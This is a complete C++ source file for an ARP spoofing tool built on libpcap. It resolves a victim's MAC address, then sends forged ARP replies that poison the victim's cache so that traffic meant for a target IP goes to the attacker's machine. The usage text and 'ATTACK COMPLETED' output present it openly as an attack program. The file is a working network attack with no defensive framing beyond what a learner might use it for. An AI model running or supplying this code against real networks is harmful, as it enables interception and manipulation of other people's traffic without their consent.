#include <cstdio>
#include <pcap.h>
#include <linux/if_ether.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket
{
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage()
{
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int getMyAddress(char *if_name, Ip *attacker_ip, Mac *attacker_mac)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1)
    {
        printf("ERR: socket(AF_UNIX, SOCK_DGRAM, 0)\n");
        return -1;
    }

    struct ifreq ifr;
    size_t if_name_len = strlen(if_name);
    if (if_name_len >= sizeof(ifr.ifr_name))
    {
        printf("ERR: if_name_len >= sizeof(ifr.ifr_name)\n");
        close(fd);
        return -1;
    }
    memcpy(ifr.ifr_name, if_name, if_name_len);
    ifr.ifr_name[if_name_len] = 0;

    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1)
    {
        puts("ERR: ioctl(fd, SIOCGIFADDR, &ifr)\n");
        close(fd);
        return -1;
    }
    struct sockaddr_in *ip_addr = (struct sockaddr_in *)&ifr.ifr_addr;
    memcpy((void *)attacker_ip, &ip_addr->sin_addr, sizeof(Ip));
    *attacker_ip = ntohl(*attacker_ip);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1)
    {
        printf("ERR: ioctl(fd, SIOCGIFHWADDR, &ifr)\n");
        close(fd);
        return -1;
    }
    memcpy((void *)attacker_mac, ifr.ifr_hwaddr.sa_data, sizeof(Mac));

    close(fd);
    return 0;
}

int getSenderMac(pcap_t *handle, Ip attacker_ip, Mac attacker_mac, Ip sender_ip, Mac *sender_mac)
{
    EthArpPacket packet_;

    packet_.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet_.eth_.smac_ = attacker_mac;
    packet_.eth_.type_ = htons(EthHdr::Arp);

    packet_.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet_.arp_.pro_ = htons(EthHdr::Ip4);
    packet_.arp_.hln_ = Mac::SIZE;
    packet_.arp_.pln_ = Ip::SIZE;
    packet_.arp_.op_ = htons(ArpHdr::Request);
    packet_.arp_.smac_ = attacker_mac;
    packet_.arp_.sip_ = htonl(Ip(attacker_ip));
    packet_.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet_.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet_), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return -1;
    }

    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)
            continue;
        if (res == -1 || res == -2)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        struct EthHdr *eth_hdr = (struct EthHdr *)(packet);
        struct ArpHdr *arp_hdr = (struct ArpHdr *)(packet + sizeof(EthHdr));
        if (ntohs(eth_hdr->type_) == EthHdr::Arp && ntohs(arp_hdr->op_) == ArpHdr::Reply && ntohl(arp_hdr->sip_) == sender_ip)
        {
            if (eth_hdr->dmac_ == attacker_mac)
            {
                memcpy((void *)sender_mac, &eth_hdr->smac_, sizeof(Mac));
                break;
            }
        }
    }

    return 0;
}

int arpInfection(pcap_t *handle, Mac attacker_mac, Ip sender_ip, Mac sender_mac, Ip target_ip)
{
    EthArpPacket packet_;

    packet_.eth_.dmac_ = sender_mac;
    packet_.eth_.smac_ = attacker_mac;
    packet_.eth_.type_ = htons(EthHdr::Arp);

    packet_.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet_.arp_.pro_ = htons(EthHdr::Ip4);
    packet_.arp_.hln_ = Mac::SIZE;
    packet_.arp_.pln_ = Ip::SIZE;
    packet_.arp_.op_ = htons(ArpHdr::Reply);
    packet_.arp_.smac_ = attacker_mac;
    packet_.arp_.sip_ = htonl(Ip(target_ip));
    packet_.arp_.tmac_ = sender_mac;
    packet_.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet_), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return -1;
    }

    return 0;
}

int attack(pcap_t *handle, Ip attacker_ip, Mac attacker_mac, Ip sender_ip, Ip target_ip)
{
    Mac sender_mac;
    if (getSenderMac(handle, attacker_ip, attacker_mac, sender_ip, &sender_mac) == -1)
    {
        printf("ERR: getSenderMac()\n");
        return -1;
    }

    if (arpInfection(handle, attacker_mac, sender_ip, sender_mac, target_ip) == -1)
    {
        printf("ERR: arpInfection()\n");
        return -1;
    }

    return 0;
}

int main(int argc, char *argv[])
{
    if (argc < 4)
    {
        usage();
        return -1;
    }

    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Ip attacker_ip;
    Mac attacker_mac;
    if (getMyAddress(dev, &attacker_ip, &attacker_mac) == -1)
    {
        printf("ERR: getMyAddress()\n");
        pcap_close(handle);
        return -1;
    }

    int num_victim = (argc - 2) / 2;
    for (int i = 1; i <= num_victim; i++)
    {
        Ip sender_ip(argv[i * 2]);
        Ip target_ip(argv[i * 2 + 1]);
        if (attack(handle, attacker_ip, attacker_mac, sender_ip, target_ip) == -1)
        {
            printf("ERR: attack()\n");
            pcap_close(handle);
            return -1;
        }
        printf("ATTACK %d COMPLETED (%s %s)\n", i, std::string(sender_ip).data(), std::string(target_ip).data());
    }

    pcap_close(handle);
    return 0;
}
